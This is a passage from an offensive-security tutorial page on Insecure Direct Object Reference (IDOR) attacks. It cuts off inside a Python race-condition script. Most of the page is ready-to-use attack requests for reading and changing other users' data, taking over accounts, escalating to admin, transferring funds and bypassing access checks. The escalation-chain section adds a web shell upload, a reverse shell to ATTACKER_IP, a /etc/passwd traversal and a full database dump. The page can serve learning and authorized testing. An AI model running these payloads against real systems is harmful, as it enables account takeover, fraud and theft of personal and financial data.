---
title: Insecure Direct Object References (IDOR)
description: Complete breakdown of IDOR vulnerabilities, payload crafting across API endpoints, object reference manipulation techniques, and privilege escalation through broken access control.
navigation:
  icon: i-lucide-scan-eye
  title: IDOR Attack
---

## What is IDOR?

Insecure Direct Object Reference (IDOR) is a **broken access control** vulnerability that occurs when an application uses **user-supplied input to directly access objects** — such as database records, files, or resources — without verifying whether the requesting user is authorized to access them.

::callout
---
icon: i-lucide-triangle-alert
color: amber
---
IDOR is not just about changing an ID in the URL. It encompasses **any situation** where the application exposes a direct reference to an internal object and fails to validate authorization. This includes numeric IDs, UUIDs, filenames, hashed values, and encoded references across URLs, request bodies, headers, and cookies.
::

The vulnerability is classified under **OWASP Top 10 — A01:2021 Broken Access Control**, which moved to the **#1 position** due to its prevalence and impact.

::card-group
  ::card
  ---
  title: OWASP — IDOR
  icon: i-lucide-book-open
  to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References
  target: _blank
  ---
  OWASP Web Security Testing Guide — Testing for Insecure Direct Object References (WSTG-ATHZ-04).
  ::

  ::card
  ---
  title: OWASP Top 10 — A01 Broken Access Control
  icon: i-lucide-shield-alert
  to: https://owasp.org/Top10/A01_2021-Broken_Access_Control/
  target: _blank
  ---
  A01:2021 — Broken Access Control. The #1 most critical web application security risk.
  ::

  ::card
  ---
  title: CWE-639
  icon: i-lucide-database
  to: https://cwe.mitre.org/data/definitions/639.html
  target: _blank
  ---
  Authorization Bypass Through User-Controlled Key — MITRE CWE classification for IDOR.
  ::

  ::card
  ---
  title: PortSwigger — Access Control
  icon: i-lucide-flask-conical
  to: https://portswigger.net/web-security/access-control/idor
  target: _blank
  ---
  PortSwigger Web Security Academy — Detailed IDOR labs and exploitation techniques.
  ::

  ::card
  ---
  title: HackTricks — IDOR
  icon: i-lucide-terminal
  to: https://book.hacktricks.wiki/en/pentesting-web/idor.html
  target: _blank
  ---
  HackTricks comprehensive IDOR exploitation guide with real-world bypass techniques.
  ::

  ::card
  ---
  title: Bug Bounty IDOR Reports
  icon: i-lucide-bug
  to: https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md
  target: _blank
  ---
  Community-curated collection of real IDOR findings from bug bounty programs.
  ::
::

---

## Types of IDOR

IDOR manifests in many forms. Understanding each type is critical for thorough testing.

::tabs
  :::tabs-item{icon="i-lucide-hash" label="Numeric ID"}
  
  The most classic and common form. A sequential numeric identifier is used to reference objects.

  ```http [Example]
  GET /api/users/1001/profile HTTP/1.1
  # Change to:
  GET /api/users/1002/profile HTTP/1.1
  ```

  ::note
  Sequential IDs are the easiest to enumerate. If your user ID is `1001`, try `1000`, `1002`, `999`, etc.
  ::
  :::

  :::tabs-item{icon="i-lucide-fingerprint" label="UUID / GUID"}
  
  Applications use UUIDs thinking they are unguessable — but they often leak in other responses.

  ```http [Example]
  GET /api/documents/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
  # UUID found in another endpoint, user listing, or API response
  ```

  ::warning
  UUIDs are **not a security control**. They prevent enumeration but not access if leaked through API responses, error messages, or other endpoints.
  ::
  :::

  :::tabs-item{icon="i-lucide-file" label="Filename / Path"}
  
  Direct reference to files on the filesystem via user-controlled filenames.

  ```http [Example]
  GET /download?file=user_1001_report.pdf HTTP/1.1
  # Change to:
  GET /download?file=user_1002_report.pdf HTTP/1.1

  # Or path traversal variant:
  GET /download?file=../../../etc/passwd HTTP/1.1
  ```
  :::

  :::tabs-item{icon="i-lucide-binary" label="Encoded / Hashed"}
  
  The reference is encoded (Base64, hex) or uses a predictable hash — giving a false sense of security.

  ```text [Base64 Encoded]
  # Original: user_id=1001
  GET /api/profile?ref=dXNlcl9pZD0xMDAxCg== HTTP/1.1
  
  # Decode → change → re-encode
  # Modified: user_id=1002
  GET /api/profile?ref=dXNlcl9pZD0xMDAyCg== HTTP/1.1
  ```

  ```text [MD5 Hash]
  # If hash is MD5(user_id):
  # MD5("1001") = b8c37e33defde51cf91e1e03e51657da
  GET /api/data/b8c37e33defde51cf91e1e03e51657da HTTP/1.1
  
  # MD5("1002") = 08f90c1a417155361a5c4b8d297e0d78
  GET /api/data/08f90c1a417155361a5c4b8d297e0d78 HTTP/1.1
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="Body Parameter"}
  
  Object references embedded in POST/PUT request bodies — often overlooked in testing.

  ```http [JSON Body]
  PUT /api/account/update HTTP/1.1
  Content-Type: application/json

  {
    "user_id": 1001,
    "email": "attacker@evil.com"
  }
  ```

  ```http [Modified — Different User]
  PUT /api/account/update HTTP/1.1
  Content-Type: application/json

  {
    "user_id": 1002,
    "email": "attacker@evil.com"
  }
  ```
  :::

  :::tabs-item{icon="i-lucide-cookie" label="Cookie / Header"}
  
  Object references stored in cookies or custom headers.

  ```http [Cookie-Based IDOR]
  GET /dashboard HTTP/1.1
  Cookie: session=abc123; user_id=1001; role=user

  # Modify cookie:
  Cookie: session=abc123; user_id=1002; role=admin
  ```

  ```http [Header-Based IDOR]
  GET /api/data HTTP/1.1
  X-User-ID: 1001
  Authorization: Bearer valid_token

  # Modify header:
  X-User-ID: 1002
  ```
  :::
::

---

## Attack Flow & Methodology

::steps{level="3"}

### Step 1 — Identify Object References

Map all endpoints and identify where the application uses direct object references.

```text [Common Reference Locations]
URL Path:        /api/users/{id}/profile
Query Parameter: /download?invoice_id=4521
Request Body:    {"order_id": 8834, "action": "view"}
Cookie:          user_id=1001
Header:          X-Account-ID: ACC-20045
Fragment:        /app#/document/55012
```

### Step 2 — Understand the Reference Pattern

Determine if the reference is sequential, UUID-based, encoded, or hashed.

| Pattern | Example | Predictability |
|---------|---------|---------------|
| Sequential Integer | `1001, 1002, 1003` | Very High |
| Padded Integer | `000001001` | High |
| UUID v1 (Time-based) | `550e8400-e29b-...` | Medium — timestamp extractable |
| UUID v4 (Random) | `f47ac10b-58cc-...` | Low — requires leakage |
| Base64 Encoded | `dXNlcl9pZD0xMDAx` | High — just decode/re-encode |
| MD5/SHA Hash | `b8c37e33defde51c...` | Medium — if input is guessable |
| Custom Format | `USR-1001-PROF` | Varies |

### Step 3 — Create Two Test Accounts

Register two accounts (User A and User B) to test access control between them.

```text [Test Setup]
Account A (Attacker):  user_id=1001, token=tokenA
Account B (Victim):    user_id=1002, token=tokenB

Test: Can Account A access Account B's resources using Account A's authentication?
```

### Step 4 — Swap References and Observe

Using Account A's session/token, replace object references with Account B's identifiers.

### Step 5 — Analyze the Response

| Response | Meaning |
|----------|---------|
| `200 OK` with victim's data | **VULNERABLE — Full IDOR** |
| `200 OK` with own data | Not vulnerable (server-side override) |
| `200 OK` with empty/default data | Partially vulnerable — data leak possible |
| `403 Forbidden` | Access control enforced |
| `401 Unauthorized` | Authentication required (not the same as authorization) |
| `404 Not Found` | Object doesn't exist or well-implemented access control |
| `500 Internal Server Error` | May indicate partial vulnerability — investigate |

::

---

## Payloads

::caution
All payloads are for **authorized security testing and educational purposes only**. Unauthorized access to systems or data is illegal under computer fraud laws worldwide.
::

### URL Path IDOR Payloads

The most straightforward vector — manipulating IDs directly in the URL path.

::code-group
```http [Sequential ID — User Profile]
# Your profile
GET /api/v1/users/1001/profile HTTP/1.1
Authorization: Bearer your_valid_token

# Victim's profile
GET /api/v1/users/1002/profile HTTP/1.1
Authorization: Bearer your_valid_token
```

```http [Sequential ID — Orders]
GET /api/orders/50001/details HTTP/1.1
Authorization: Bearer your_valid_token

# Other users' orders
GET /api/orders/50000/details HTTP/1.1
GET /api/orders/50002/details HTTP/1.1
GET /api/orders/49999/details HTTP/1.1
```

```http [Sequential ID — Documents]
GET /documents/download/10234 HTTP/1.1
Cookie: session=your_session

GET /documents/download/10233 HTTP/1.1
GET /documents/download/10235 HTTP/1.1
GET /documents/download/1 HTTP/1.1
```

```http [Nested Resource IDOR]
# Your organization's users
GET /api/orgs/501/users HTTP/1.1
Authorization: Bearer your_token

# Other organization's users
GET /api/orgs/502/users HTTP/1.1
GET /api/orgs/500/users HTTP/1.1
GET /api/orgs/1/users HTTP/1.1
```

```http [Multi-Level Nested IDOR]
GET /api/companies/10/departments/5/employees/1001 HTTP/1.1

# Try changing each level independently:
GET /api/companies/11/departments/5/employees/1001 HTTP/1.1
GET /api/companies/10/departments/6/employees/1001 HTTP/1.1
GET /api/companies/10/departments/5/employees/1002 HTTP/1.1
GET /api/companies/11/departments/6/employees/1002 HTTP/1.1
```
::

### Query Parameter IDOR Payloads

::code-group
```http [Basic Parameter Manipulation]
GET /account/settings?user_id=1001 HTTP/1.1
GET /account/settings?user_id=1002 HTTP/1.1
```

```http [Invoice/Receipt Download]
GET /billing/invoice?id=INV-20240001 HTTP/1.1
GET /billing/invoice?id=INV-20240002 HTTP/1.1
GET /billing/invoice?id=INV-20239999 HTTP/1.1
```

```http [Multiple Parameters]
GET /api/data?account_id=ACC001&report_id=RPT5501 HTTP/1.1
GET /api/data?account_id=ACC002&report_id=RPT5501 HTTP/1.1
GET /api/data?account_id=ACC001&report_id=RPT5502 HTTP/1.1
```

```http [Array/List Parameters]
GET /api/users?ids[]=1001&ids[]=1002&ids[]=1003 HTTP/1.1
GET /api/messages?thread_id=500&user_ids=1001,1002,1003 HTTP/1.1
```

```http [Filter/Search Parameter IDOR]
GET /api/transactions?filter[user_id]=1001 HTTP/1.1
GET /api/transactions?filter[user_id]=1002 HTTP/1.1
GET /api/logs?search=user:1002 HTTP/1.1
```
::

### Request Body IDOR Payloads

Body-based IDORs are common in REST APIs — especially on PUT, PATCH, and POST operations.

::code-group
```http [JSON — Profile Update]
PUT /api/profile HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_token

{
  "user_id": 1002,
  "email": "attacker@evil.com",
  "name": "Hacked User"
}
```

```http [JSON — Password Change]
POST /api/change-password HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_token

{
  "user_id": 1002,
  "old_password": "anything",
  "new_password": "attacker_password123"
}
```

```http [JSON — Role Modification]
PATCH /api/users/update HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_token

{
  "user_id": 1001,
  "role": "admin",
  "is_superuser": true
}
```

```http [JSON — Delete Another User's Resource]
DELETE /api/posts HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_token

{
  "post_id": 8834,
  "owner_id": 1002
}
```

```http [Form Data — File Access]
POST /download HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Cookie: session=your_session

file_id=9001&user_id=1002&format=pdf
```

```http [XML Body — SOAP/Legacy API]
POST /api/service HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<request>
  <action>getUserData</action>
  <userId>1002</userId>
  <requesterId>1001</requesterId>
</request>
```

```http [GraphQL — IDOR via Query]
POST /graphql HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_token

{
  "query": "query { user(id: 1002) { id email name ssn creditCard { number expiry } } }"
}
```

```http [GraphQL — Mutation IDOR]
POST /graphql HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_token

{
  "query": "mutation { updateUser(id: 1002, input: { email: \"attacker@evil.com\" }) { id email } }"
}
```
::

### Encoded / Obfuscated Reference Payloads

::code-group
```text [Base64 Encoded IDs]
# Decode the reference:
echo "dXNlcl9pZD0xMDAx" | base64 -d
# Output: user_id=1001

# Encode a different ID:
echo -n "user_id=1002" | base64
# Output: dXNlcl9pZD0xMDAy

# Payload:
GET /api/profile?ref=dXNlcl9pZD0xMDAy HTTP/1.1
```

```text [Hex Encoded IDs]
# user_id=1001 in hex: 757365725f69643d31303031
# user_id=1002 in hex: 757365725f69643d31303032

GET /api/data/757365725f69643d31303032 HTTP/1.1
```

```text [URL Encoded / Double Encoded]
# Normal:
GET /api/users/1002 HTTP/1.1

# URL Encoded:
GET /api/users/%31%30%30%32 HTTP/1.1

# Double Encoded:
GET /api/users/%25%33%31%25%33%30%25%33%30%25%33%32 HTTP/1.1
```

```text [Hashed IDs — MD5]
# If the app uses MD5(user_id):
# MD5("1001") = b8c37e33defde51cf91e1e03e51657da
# MD5("1002") = 08f90c1a417155361a5c4b8d297e0d78
# MD5("1")    = c4ca4238a0b923820dcc509a6f75849b

# Generate hashes for common IDs:
for i in $(seq 1 1000); do echo "$i:$(echo -n $i | md5sum | cut -d' ' -f1)"; done

GET /api/users/08f90c1a417155361a5c4b8d297e0d78/data HTTP/1.1
```

```text [Integer Overflow / Type Juggling]
# Try various representations of the same number
GET /api/users/1002 HTTP/1.1
GET /api/users/1002.0 HTTP/1.1
GET /api/users/1.002e3 HTTP/1.1
GET /api/users/01002 HTTP/1.1
GET /api/users/+1002 HTTP/1.1
GET /api/users/1002%00 HTTP/1.1
```

```text [UUID Manipulation]
# UUID v1 contains timestamp — generate for nearby time:
# Original:  550e8400-e29b-41d4-a716-446655440000
# Time-adjacent UUIDs can be predicted

# Also try:
# Nil UUID:        00000000-0000-0000-0000-000000000000
# Sequential:      550e8400-e29b-41d4-a716-446655440001
# Case variation:  550E8400-E29B-41D4-A716-446655440000
```
::

### HTTP Method IDOR Payloads

Some applications enforce access control only on certain HTTP methods.

::code-group
```http [GET Blocked — Try POST]
# If GET is blocked:
GET /api/users/1002/profile HTTP/1.1
# Response: 403 Forbidden

# Try POST:
POST /api/users/1002/profile HTTP/1.1
# Response: 200 OK — IDOR!
```

```http [Method Override Headers]
# Application may accept method overrides
GET /api/users/1002 HTTP/1.1
X-HTTP-Method-Override: PUT

POST /api/users/1002 HTTP/1.1
X-HTTP-Method: DELETE

GET /api/users/1002 HTTP/1.1
X-Method-Override: PATCH
```

```http [PATCH for Partial Update]
PATCH /api/users/1002 HTTP/1.1
Content-Type: application/json
Authorization: Bearer your_token

{
  "email": "attacker@evil.com"
}
```

```http [OPTIONS to Discover Allowed Methods]
OPTIONS /api/users/1002 HTTP/1.1
# Response may reveal: Allow: GET, PUT, DELETE, PATCH
# Then test each method for access control
```
::

### Wildcard / Mass Assignment IDOR Payloads

::code-group
```http [Wildcard ID Access]
GET /api/users/*/profile HTTP/1.1
GET /api/users/all/data HTTP/1.1
GET /api/users/0/profile HTTP/1.1
GET /api/users/-1/profile HTTP/1.1
GET /api/users/null/profile HTTP/1.1
GET /api/users/undefined/profile HTTP/1.1
```

```http [Mass Assignment — Add Admin Role]
# Normal update request
PUT /api/profile HTTP/1.1
Content-Type: application/json

{
  "name": "Attacker",
  "email": "attacker@evil.com"
}

# Add hidden/undocumented fields:
PUT /api/profile HTTP/1.1
Content-Type: application/json

{
  "name": "Attacker",
  "email": "attacker@evil.com",
  "role": "admin",
  "is_admin": true,
  "user_type": "administrator",
  "permissions": ["all"],
  "account_type": "premium",
  "verified": true,
  "balance": 999999
}
```

```http [Parameter Pollution]
# Add the same parameter multiple times
GET /api/profile?user_id=1001&user_id=1002 HTTP/1.1

# Backend may use:
# First occurrence (1001) — secure
# Last occurrence (1002) — exploitable
# Array [1001, 1002] — returns both
```
::

---

## IDOR Across API Architectures

::accordion
  :::accordion-item{icon="i-lucide-braces" label="REST API IDOR"}
  
  REST APIs are the most common target due to predictable URL structures.

  ::code-group
  ```http [CRUD Operations]
  # CREATE — Create resource for another user
  POST /api/v2/users/1002/addresses HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {"street": "123 Hacked St", "city": "Pwned City"}

  # READ — Access another user's data
  GET /api/v2/users/1002/profile HTTP/1.1
  Authorization: Bearer your_token

  # UPDATE — Modify another user's resource
  PUT /api/v2/users/1002/settings HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {"notification_email": "attacker@evil.com"}

  # DELETE — Remove another user's resource
  DELETE /api/v2/users/1002/posts/8834 HTTP/1.1
  Authorization: Bearer your_token
  ```

  ```http [API Versioning Bypass]
  # v2 has access control — try older versions
  GET /api/v2/users/1002/profile HTTP/1.1   # 403 Forbidden
  GET /api/v1/users/1002/profile HTTP/1.1   # 200 OK — IDOR!
  GET /api/v0/users/1002/profile HTTP/1.1
  GET /api/users/1002/profile HTTP/1.1       # No version prefix
  GET /api/internal/users/1002/profile HTTP/1.1
  GET /api/beta/users/1002/profile HTTP/1.1
  ```

  ```http [Content-Type Switching]
  # JSON blocked — try XML
  GET /api/users/1002 HTTP/1.1
  Accept: application/json
  # 403 Forbidden

  GET /api/users/1002 HTTP/1.1
  Accept: application/xml
  # 200 OK — Different parser, different access control!

  # Or request with different Content-Type on POST
  POST /api/users/1002/update HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  email=attacker@evil.com
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-git-branch" label="GraphQL IDOR"}
  
  GraphQL's flexible query structure makes IDOR testing unique — attackers can request exactly the fields they want.

  ::code-group
  ```http [Direct Object Query]
  POST /graphql HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {
    "query": "{ user(id: \"1002\") { id username email phone address socialSecurity } }"
  }
  ```

  ```http [Nested Relationship Traversal]
  POST /graphql HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {
    "query": "{ user(id: \"1002\") { id email orders { id total items { name price } paymentMethod { cardNumber expiry } } } }"
  }
  ```

  ```http [Mutation — Modify Another User]
  POST /graphql HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {
    "query": "mutation { updateUserEmail(userId: \"1002\", newEmail: \"attacker@evil.com\") { success message } }"
  }
  ```

  ```http [Batch Query — Mass Data Extraction]
  POST /graphql HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {
    "query": "{ user1: user(id: \"1\") { id email } user2: user(id: \"2\") { id email } user3: user(id: \"3\") { id email } user4: user(id: \"4\") { id email } user5: user(id: \"5\") { id email } }"
  }
  ```

  ```http [Introspection — Discover Hidden Fields]
  POST /graphql HTTP/1.1
  Content-Type: application/json

  {
    "query": "{ __type(name: \"User\") { fields { name type { name } } } }"
  }
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-cloud" label="gRPC / Protobuf IDOR"}
  
  gRPC services can also be vulnerable — the object reference is in the protobuf message.

  ::code-group
  ```protobuf [Proto Definition]
  // user.proto
  service UserService {
    rpc GetUser (GetUserRequest) returns (UserResponse);
    rpc UpdateUser (UpdateUserRequest) returns (UserResponse);
    rpc DeleteUser (DeleteUserRequest) returns (Empty);
  }

  message GetUserRequest {
    int32 user_id = 1;  // IDOR target — change this value
  }
  ```

  ```bash [grpcurl — IDOR Test]
  # Get your own profile
  grpcurl -d '{"user_id": 1001}' \
    -H 'Authorization: Bearer your_token' \
    target.com:443 UserService.GetUser

  # Get another user's profile
  grpcurl -d '{"user_id": 1002}' \
    -H 'Authorization: Bearer your_token' \
    target.com:443 UserService.GetUser
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-webhook" label="WebSocket IDOR"}
  
  WebSocket connections can carry IDOR-vulnerable messages.

  ::code-group
  ```javascript [WebSocket IDOR — Client Side]
  const ws = new WebSocket('wss://target.com/ws');

  ws.onopen = () => {
    // Subscribe to your own channel
    ws.send(JSON.stringify({
      action: 'subscribe',
      channel: 'user_1001_notifications'
    }));

    // IDOR — Subscribe to another user's channel
    ws.send(JSON.stringify({
      action: 'subscribe',
      channel: 'user_1002_notifications'
    }));
    
    // IDOR — Request another user's messages
    ws.send(JSON.stringify({
      action: 'get_messages',
      user_id: 1002
    }));
  };

  ws.onmessage = (event) => {
    console.log('Received:', JSON.parse(event.data));
  };
  ```
  ::
  :::
::

---

## Privilege Escalation via IDOR

::warning
IDOR is one of the most direct paths to privilege escalation — it can lead to complete account takeover, data exfiltration, and administrative access with a single manipulated request.
::

### How PrivEsc Works

IDOR-based privilege escalation occurs when manipulating object references grants access to **higher-privileged resources, functions, or roles**.

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Vertical PrivEsc"}
  
  **Vertical Privilege Escalation** — accessing admin-level resources or functions as a regular user.

  ::steps{level="4"}

  #### Discover admin user ID or resource reference

  Admin IDs are often low numbers (`1`, `2`, `100`) or follow predictable patterns.

  ```http [Enumerate Admin Endpoints]
  # Admin profile — common low IDs
  GET /api/users/1/profile HTTP/1.1
  GET /api/users/2/profile HTTP/1.1

  # Admin-specific resources
  GET /api/admin/settings?admin_id=1 HTTP/1.1
  GET /api/reports/system?generated_by=1 HTTP/1.1
  ```

  #### Access admin's data using your auth token

  ```http [Read Admin Data]
  GET /api/users/1/profile HTTP/1.1
  Authorization: Bearer regular_user_token

  # Response:
  {
    "id": 1,
    "username": "admin",
    "email": "admin@target.com",
    "role": "super_admin",
    "api_keys": ["sk_live_xxx..."],
    "internal_tools_access": true
  }
  ```

  #### Modify your own role via IDOR + Mass Assignment

  ```http [Self-Elevate to Admin]
  PUT /api/users/1001 HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer regular_user_token

  {
    "id": 1001,
    "role": "admin",
    "is_superuser": true,
    "permissions": ["*"]
  }
  ```

  #### Access admin panel with elevated privileges

  ```http [Admin Panel Access]
  GET /admin/dashboard HTTP/1.1
  Authorization: Bearer regular_user_token
  # Now returns admin dashboard — full vertical PrivEsc!
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-users" label="Horizontal PrivEsc"}
  
  **Horizontal Privilege Escalation** — accessing another user's resources at the same privilege level.

  ::steps{level="4"}

  #### Identify a target user's resources

  ```http [Access Another User's Data]
  # Your orders
  GET /api/users/1001/orders HTTP/1.1
  Authorization: Bearer your_token

  # Victim's orders
  GET /api/users/1002/orders HTTP/1.1
  Authorization: Bearer your_token
  ```

  #### Modify victim's account settings

  ```http [Change Victim's Email — Account Takeover]
  PUT /api/users/1002/settings HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {
    "email": "attacker@evil.com"
  }

  # Then trigger password reset for attacker@evil.com
  # → Full account takeover
  ```

  #### Download victim's private files

  ```http [Access Private Documents]
  GET /api/users/1002/documents HTTP/1.1
  Authorization: Bearer your_token

  # Response:
  {
    "documents": [
      {"id": 5501, "name": "tax_return_2024.pdf", "url": "/files/5501"},
      {"id": 5502, "name": "medical_records.pdf", "url": "/files/5502"},
      {"id": 5503, "name": "bank_statement.pdf", "url": "/files/5503"}
    ]
  }

  # Download each:
  GET /files/5501 HTTP/1.1
  Authorization: Bearer your_token
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-layers" label="Full PrivEsc Chain"}
  
  **Complete Exploitation Chain** — from IDOR to system compromise.

  | Step | Technique | Access Level |
  |------|-----------|-------------|
  | 1 | IDOR — Read admin profile | Discover admin email, API keys |
  | 2 | IDOR — Modify admin email | Change admin's email to attacker's |
  | 3 | Password Reset on new email | Full admin account takeover |
  | 4 | Admin Panel — API key access | Access to internal services |
  | 5 | Admin Panel — File upload | Upload web shell |
  | 6 | Remote Code Execution | System-level shell |
  | 7 | Lateral Movement | Access internal network |
  | 8 | Data Exfiltration | Full database dump |

  ::code-group
  ```http [Step 1 — Read Admin Profile via IDOR]
  GET /api/users/1/profile HTTP/1.1
  Authorization: Bearer regular_user_token

  # Response reveals admin email and internal info
  ```

  ```http [Step 2 — Change Admin Email via IDOR]
  PATCH /api/users/1/email HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer regular_user_token

  {"email": "attacker@evil.com"}
  ```

  ```http [Step 3 — Trigger Password Reset]
  POST /forgot-password HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  email=attacker@evil.com
  # Reset link goes to attacker's email
  ```

  ```http [Step 4 — Access Admin API Keys]
  GET /admin/settings/api-keys HTTP/1.1
  Authorization: Bearer admin_token

  # Response: {"keys": [{"name": "prod_key", "value": "sk_live_..."}]}
  ```

  ```bash [Step 5-6 — Upload Shell via Admin Panel]
  curl -X POST https://target.com/admin/uploads \
    -H "Authorization: Bearer admin_token" \
    -F "file=@shell.php" \
    -F "path=/public/uploads/"

  # Execute:
  curl "https://target.com/uploads/shell.php?cmd=id"
  # uid=33(www-data)
  ```

  ```bash [Step 7-8 — Pivot and Exfiltrate]
  # Reverse shell
  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

  # Database dump
  mysqldump -u root -p'db_password_from_config' --all-databases > /tmp/dump.sql
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-wallet" label="Financial PrivEsc"}
  
  **Financial Privilege Escalation** — IDOR leading to monetary impact.

  ::code-group
  ```http [Transfer Funds — Source Account IDOR]
  POST /api/transfer HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {
    "from_account": "ACC-1002",
    "to_account": "ACC-1001",
    "amount": 10000.00,
    "currency": "USD"
  }
  ```

  ```http [Apply Discount/Coupon to Another Order]
  POST /api/orders/8834/apply-discount HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {
    "order_id": 8835,
    "discount_code": "EMPLOYEE100",
    "discount_percent": 100
  }
  ```

  ```http [Modify Subscription Tier]
  PATCH /api/subscriptions/SUB-1001 HTTP/1.1
  Content-Type: application/json
  Authorization: Bearer your_token

  {
    "plan": "enterprise",
    "price_override": 0,
    "features": ["unlimited_users", "api_access", "priority_support"]
  }
  ```

  ```http [Access Another User's Payment Methods]
  GET /api/users/1002/payment-methods HTTP/1.1
  Authorization: Bearer your_token

  # Response may contain tokenized or partial card data
  {
    "cards": [
      {"id": "pm_xxx", "last4": "4242", "exp": "12/26", "brand": "visa"},
      {"id": "pm_yyy", "last4": "1234", "exp": "03/25", "brand": "mastercard"}
    ]
  }
  ```
  ::
  :::
::

---

## Bypass Techniques

When basic IDOR doesn't work, these bypasses often succeed.

::accordion
  :::accordion-item{icon="i-lucide-shuffle" label="Bypass: ID Format Manipulation"}
  
  Applications may validate IDs inconsistently across different formats.

  ::code-group
  ```text [Numeric Format Variations]
  # Standard
  GET /api/users/1002

  # With leading zeros
  GET /api/users/001002

  # As float
  GET /api/users/1002.0

  # Scientific notation
  GET /api/users/1.002e3

  # Negative indexing
  GET /api/users/-1

  # With sign
  GET /api/users/+1002

  # Hex representation
  GET /api/users/0x3EA

  # Octal representation
  GET /api/users/01752

  # Binary string
  GET /api/users/0b1111101010

  # Unicode digits
  GET /api/users/１００２
  ```

  ```text [String Format Variations]
  # Null byte injection
  GET /api/users/1002%00
  GET /api/users/1002%00.json

  # Whitespace injection
  GET /api/users/1002%20
  GET /api/users/%201002
  GET /api/users/1002%09

  # With file extension
  GET /api/users/1002.json
  GET /api/users/1002.xml
  GET /api/users/1002.csv

  # Case variation (for string IDs)
  GET /api/users/Admin
  GET /api/users/ADMIN
  GET /api/users/aDmIn
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-route" label="Bypass: Path Traversal in IDOR"}
  
  Combine path manipulation with IDOR.

  ::code-group
  ```http [Dot-Dot-Slash]
  GET /api/users/1001/../1002/profile HTTP/1.1
  GET /api/users/1001/../../admin/users/1002 HTTP/1.1
  ```

  ```http [URL Encoding Variants]
  GET /api/users/1001%2f..%2f1002/profile HTTP/1.1
  GET /api/users/1001%252f..%252f1002/profile HTTP/1.1
  GET /api/users/1001/..%252f1002/profile HTTP/1.1
  ```

  ```http [Semicolon / Parameter Injection]
  GET /api/users/1001;id=1002/profile HTTP/1.1
  GET /api/users/1002;.css HTTP/1.1
  GET /api/users/1002#.json HTTP/1.1
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-wrap-text" label="Bypass: Wrapping / JSON Parameter Injection"}
  
  Some APIs process additional JSON keys that bypass authorization checks.

  ::code-group
  ```http [Wrap ID in Object]
  # Rejected:
  PUT /api/profile HTTP/1.1
  {"user_id": 1002, "name": "Hacked"}

  # Wrap in nested object:
  PUT /api/profile HTTP/1.1
  {"profile": {"user_id": 1002}, "name": "Hacked"}
  ```

  ```http [JSON Type Juggling]
  # String instead of integer
  {"user_id": "1002"}

  # Array
  {"user_id": [1002]}

  # Object
  {"user_id": {"$eq": 1002}}

  # Boolean
  {"user_id": true}
  ```

  ```http [Parameter Name Variations]
  {"user_id": 1002}
  {"userId": 1002}
  {"userid": 1002}
  {"user-id": 1002}
  {"uid": 1002}
  {"id": 1002}
  {"account_id": 1002}
  {"accountId": 1002}
  {"owner_id": 1002}
  {"owner": 1002}
  {"author_id": 1002}
  {"created_by": 1002}
  {"member_id": 1002}
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-repeat" label="Bypass: HTTP Method / Endpoint Switching"}
  
  Access control may not be consistent across all methods and endpoint aliases.

  ::code-group
  ```http [Method Switching]
  # GET blocked — try other methods
  GET    /api/users/1002 → 403
  POST   /api/users/1002 → 200 ✓
  PUT    /api/users/1002 → 200 ✓
  PATCH  /api/users/1002 → 200 ✓
  DELETE /api/users/1002 → 200 ✓
  HEAD   /api/users/1002 → 200 ✓ (headers may leak info)
  ```

  ```http [Endpoint Variations]
  # Blocked endpoint → try alternatives
  /api/users/1002                    → 403
  /api/user/1002                     → 200 ✓ (singular)
  /api/Users/1002                    → 200 ✓ (case)
  /api/v1/users/1002                 → 200 ✓ (old version)
  /api/internal/users/1002           → 200 ✓ (internal)
  /api/debug/users/1002              → 200 ✓ (debug)
  /api/users/1002/                   → 200 ✓ (trailing slash)
  /api/users/1002.json               → 200 ✓ (extension)
  /api/users/1002?format=json        → 200 ✓ (format param)
  /users/1002                        → 200 ✓ (no api prefix)
  /api/export/users/1002             → 200 ✓ (export)
  /api/users/1002/edit               → 200 ✓ (edit view)
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Bypass: Race Condition IDOR"}
  
  Sometimes access control checks and data operations are not atomic — race conditions can bypass them.

  ::code-group
  ```python [Race Condition IDOR Script]
  import threading
  import requests

  TARGET = "https://target.com/api/users"
  TOKEN = "Bearer your_token"
  VICTIM_ID = 1002

  def access_profile():
      resp = requests.get(
          f"{TARGET}/{VICTIM_ID}/profile",
          headers={"Authorization": TOKEN}
      )
      if resp.status_code == 200 and "email" in resp.text:
